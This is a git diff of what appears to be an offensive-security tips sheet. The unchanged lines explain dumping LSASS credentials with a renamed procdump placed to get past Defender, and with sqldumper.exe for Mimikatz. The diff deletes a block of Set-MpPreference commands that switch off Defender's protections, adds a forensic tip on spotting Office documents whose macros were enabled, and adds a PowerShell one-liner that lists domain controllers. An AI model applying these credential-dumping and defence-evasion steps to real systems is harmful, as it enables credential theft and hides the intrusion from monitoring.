@@ -59,20 +59,17 @@ They get cached here:
 If you rename __procdump.exe to __dump64.exe__ and place it in the "C:\Program Files (x86)\Microsoft Visual Studio\*" folder, you can bypass Defender and dump __LSASS__.
 
 
-# 8) Disable Defender 
+# 8) Malicious Macro Enabled
 
-```powershell
-shell Set-MpPreference -DisableRealtimeMonitoring $true 
-shell Set-MpPreference -EnableRealtimeMonitoring $true
-Set-MpPreference -DisableArchiveScanning $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableIntrusionPreventionSystem $true
-Set-MpPreference -DisableScanningNetworkFiles $true
-Set-MpPreference -MAPSReporting 0
-Set-MpPreference -DisableCatchupFullScan $True
-Set-MpPreference -DisableCatchupQuickScan $True
-```
+How to prove malicious macro was enabled & clicked? 👀 #DFIR 
+
+HKEY_LOCAL_MACHINE\USERDAT\Software\Microsoft\Office\<VERS>\<PROGRAM>\Security\Trusted Documents\TrustRecords 
+
+Look ONLY for values where last four bytes are "FF FF FF 7F". 
+
+These files had macros enabled
+
+
 
 # 9) SQldumper LSASS
 
@@ -82,3 +79,10 @@ __sqldumper.exe__ 540 0 0x01100:40
 
 Usecase: Dump __LSASS.exe__ to Mimikatz compatible dump using PID.
 
+# 10 Powershell domain control
+
+```powershell
+powershell detect domain controller 
+
+$F = [system.directoryservices.activedirectory.Forest]::GetCurrentForest();$F.domains | ForEach-Object {$_.DomainControllers} | ForEach-Object {$_.Name + " " + $_.IPAddress}
+```
